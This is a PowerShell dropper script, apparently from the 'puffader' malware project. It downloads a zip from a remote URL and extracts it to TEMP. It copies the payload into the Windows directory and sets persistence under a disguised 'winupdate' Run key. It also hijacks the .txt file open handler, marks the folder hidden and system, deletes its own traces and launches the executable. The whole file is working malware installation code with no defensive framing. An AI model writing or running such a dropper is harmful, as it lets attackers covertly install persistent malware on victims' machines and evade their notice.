# set url to zip file eg. http://mywebserver.com/puffader.zip
$url = ""
# set zip file name eg. puffader.zip
$ZipName = ""
# set folder name eg. puffader
$strFileDir = "" 

$TEMP = "$env:TEMP"

# download zip file
(New-Object System.Net.WebClient).DownloadFile($url, "$TEMP\$ZipName")


Add-Type -AssemblyName System.IO.Compression.FileSystem

# function to unzip zip file
function Unzip
{
    param([string]$zipfile, [string]$outpath)

    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}
Unzip "$TEMP\$ZipName" "$TEMP"

# change location to temp
Set-Location -Path "$TEMP"

# --------------------- rest of code is referenced from persistence.ps1 ---------------------
$strScriptPath = $MyInvocation.MyCommand.Path; $strDirScriptPath = Split-Path $strScriptPath
Set-Location -Path $strDirScriptPath
$WINDIR = "$env:WINDIR"
If (test-path "$WINDIR\$strFileDir") {exit}
Copy-Item -Path $strFileDir -Destination $WINDIR -Recurse -Force
Get-ChildItem -Filter *.exe $WINDIR\$strFileDir | ForEach {
    If (Compare-Object $_.Name "w9xpopen.exe") {
    $strFilePath = $_.FullName
    }
}
New-ItemProperty -path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -name winupdate -PropertyType String -value "$strFilePath" -Force
New-ItemProperty -path HKLM:\Software\Classes\txtfile\shell\open\command -name "(Default)" -PropertyType ExpandString -value "$strFilePath -o %1" -Force
$(Get-Item $WINDIR\$strFileDir).Attributes = ‘Hidden, System’
# -------------------------------------------------------------------------------------------

# remove temp files
Remove-Item "$TEMP\$strFileDir" -Force -Recurse
Remove-Item "$TEMP\$ZipName" -Force
Remove-Item "$TEMP\payload.ps1" -Force

# start program
Start-Process -FilePath "$strFilePath"
